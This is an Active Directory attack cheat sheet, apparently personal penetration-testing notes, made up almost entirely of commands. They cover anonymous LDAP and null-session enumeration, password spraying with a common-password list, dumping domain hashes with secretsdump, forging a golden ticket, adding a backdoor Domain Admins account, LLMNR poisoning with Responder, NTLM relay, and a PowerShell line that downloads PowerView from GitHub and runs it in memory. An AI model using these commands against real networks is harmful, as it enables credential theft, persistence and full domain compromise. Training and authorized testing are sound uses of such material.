## Identify if target is domain-joined
```bash
nmap -p 88,389,636,3268,3269 $IP
```

## Discover domain name via reverse DNS
```bash
# nslookup OR dig -x
nslookup $IP
```

## Discover NetBIOS domain name
```bash
# nbtscan OR nmblookup -A
nbtscan $IP
```

## Test anonymous LDAP binding and extract users
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=*)" | head -20
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
```

## Extract computers from anonymous LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d: -f2 | sort > computers.txt
```

## Test SMB null sessions for share enumeration
```bash
# -u '' for null OR -u 'guest' for guest; add --users for user enum
netexec smb $IP -u '' -p '' --shares
```

## Enumerate domain with enum4linux-ng via null session
```bash
enum4linux-ng -A $IP
```

## Test RPC null session and enumerate users
```bash
# Add -c "enumdomusers" OR -c "enumdomgroups" OR -c "querydominfo"
rpcclient -U "" -N $IP
```

## Create common AD password list for spraying
```bash
cat > passwords.txt << 'EOF'
Password123!
Welcome123!
Summer2024!
Spring2024!
CompanyName2024!
EOF
```

## Password spray with NetExec
```bash
# -p 'Password123!' for single OR -p passwords.txt for file
# Change protocol: smb, ldap, OR winrm
netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```

## Test cracked service account credentials across domain
```bash
# Test smb --shares OR winrm for shell access
netexec smb $IP -u serviceaccount -p crackedpassword --shares
```

## Dump domain credentials with secretsdump
Add -just-dc for DC hashes only OR -just-dc-ntlm for NTLM only
```bash
impacket-secretsdump domain.local/username:password@$IP
```

## Dump domain credentials from SAM and SYSTEM locally
```
impacket-secretsdump -sam SAM -system -SYSTEM LOCAL
```

## Create golden ticket with krbtgt hash
```bash
impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain domain.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 administrator
```

## Create persistent domain admin account
```cmd
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain
```

## Check for SMB relay opportunities
```bash
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

## Run Responder for LLMNR/NBT-NS poisoning
```bash
responder -I eth0 -wrf
```

## Setup ntlmrelayx for SMB relay attacks
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

## Download PowerView on Windows target
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```

## Enumerate domain with PowerView
```powershell
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
```

## Find computers with unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained
```

## Find users with SPN for Kerberoasting
```powershell
Get-DomainUser -SPN
```

## Find domain shares accessible by current user
```powershell
Find-DomainShare -CheckShareAccess
```

## Find local admin access on domain computers
```powershell
Find-LocalAdminAccess
Test-AdminAccess
```

## Enumerate domain trusts
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

## Get domain password policy
```bash
# Use smb with --pass-pol OR ldap with --password-policy
netexec smb $IP -u username -p password --pass-pol
```

## Enumerate with ldapdomaindump
```bash
ldapdomaindump -u 'domain.local\username' -p password $IP
```

## Check for MS17-010 EternalBlue on domain controllers
```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
```

## Password spray across subnet range
```bash
netexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
```

## Test administrative access across multiple hosts
```bash
# Change protocol: smb OR winrm
netexec smb 10.10.10.0/24 -u administrator -p password
```

---

# Reference

For extended AD methodology, decision trees, attack chain combinations, BloodHound analysis prioritization, and time management strategies, see [[AD Reference]]

**Use [[CHECKLIST-AD-Domain]] for systematic credential testing when you get new credentials.**
**Use [[CHECKLIST-Post-Exploitation]] after compromising each new host.**
